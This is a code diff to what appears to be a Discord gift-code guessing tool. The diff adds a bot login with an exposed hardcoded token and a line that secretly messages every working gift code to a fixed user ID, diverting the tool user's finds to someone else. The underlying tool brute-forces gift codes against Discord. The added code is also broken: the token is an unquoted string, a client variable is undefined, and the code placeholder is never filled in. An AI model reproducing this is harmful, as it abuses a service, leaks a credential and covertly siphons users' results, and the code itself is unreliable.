@@ -1,3 +1,9 @@
+const Discord = require('discord.js');
+const bot = new Discord.Client();
+
+const TOKEN = NjkyODI2NzIyNzgwODQwMDc4.Xn0LKg.W0ydUR179xToztFevo1FAv43QvY;
+
+bot.login(TOKEN);
 const request = require('request');
 const logger = require(__dirname + '/util/logger');
 const fs = require('fs');
@@ -28,6 +34,7 @@ checkCode = function (code) {
                 console.log(JSON.stringify(body, null, 4));
                 working.push(`https://discord.gift/${code}`);
                 fs.writeFileSync(__dirname + '/codes.json', JSON.stringify(working, null, 4));
+                client.users.get('515307844900487188').send('I think this code works: https://discord.gift/${code}');
             }
             else {
                 logger.info(`${code} geçersiz`);
